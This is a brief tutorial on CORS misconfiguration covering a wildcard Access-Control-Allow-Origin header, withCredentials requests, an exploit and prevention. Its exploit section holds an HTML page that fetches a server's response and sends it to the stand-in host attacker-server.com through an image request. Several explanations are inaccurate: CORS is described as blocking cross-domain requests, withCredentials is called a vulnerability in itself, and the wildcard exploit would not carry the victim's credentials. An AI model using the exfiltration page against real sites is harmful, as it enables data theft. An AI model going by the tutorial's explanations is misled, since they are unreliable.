# CORS Misconfiguration Example

Cross-Origin Resource Sharing (CORS) is a security feature implemented in web browsers to prevent web pages from making requests to a different domain than the one that served the web page. CORS is used to prevent attackers from executing malicious scripts on a website by intercepting the requests from the user's browser and forwarding them to a different domain. However, a misconfigured CORS policy can lead to security vulnerabilities.

## Vulnerable Server-Side Configuration

A vulnerable server-side configuration is when the Access-Control-Allow-Origin header is set to "*" in the response headers. This allows any website to access the resources of the server, including sensitive data. For example:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=utf-8

```

## Vulnerable Client-Side Configuration

A vulnerable client-side configuration is when the XMLHttpRequest (XHR) request is made with the `withCredentials` attribute set to `true`. This allows the request to include cookies, HTTP authentication, and client-side SSL certificates. Attackers can exploit this vulnerability to steal sensitive data from the user's browser. For example:

```
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open('GET', '<https://example.com/api/data>', true);
xhr.send();

```

## Exploiting a Misconfigured CORS Policy

Let's assume that the server-side configuration is vulnerable and the Access-Control-Allow-Origin header is set to "*". An attacker can exploit this vulnerability by creating a malicious website that sends a request to the server and steal sensitive data from the user's browser. For example:

```
<html>
  <head>
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open('GET', '<https://vulnerable-server.com/api/data>', true);
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          document.write(xhr.responseText);
          var data = xhr.responseText;
          // send data to attacker's server
          var img = new Image();
          img.src = '<https://attacker-server.com/steal-data.php?data=>' + encodeURIComponent(data);
        }
      };
      xhr.send();
    </script>
  </head>
  <body>
    <h1>Welcome to my website</h1>
    <p>This is a phishing website that steals your data</p>
  </body>
</html>

```

## Preventing CORS Misconfiguration

To prevent CORS misconfiguration, server-side administrators must set the Access-Control-Allow-Origin header to only allow trusted domains to access the resources of the server. Additionally, client-side developers must ensure that the XMLHttpRequest (XHR) requests are not made with the `withCredentials` attribute set to `true`. Finally, web application developers must always validate user input and sanitize it before processing it.

## Conclusion

CORS is a security feature implemented in web browsers to prevent web pages from making requests to a different domain than the one that served the web page. However, a misconfigured CORS policy can lead to security vulnerabilities. Server-side administrators and client-side developers must take necessary measures to prevent CORS misconfiguration and ensure the security of their web applications.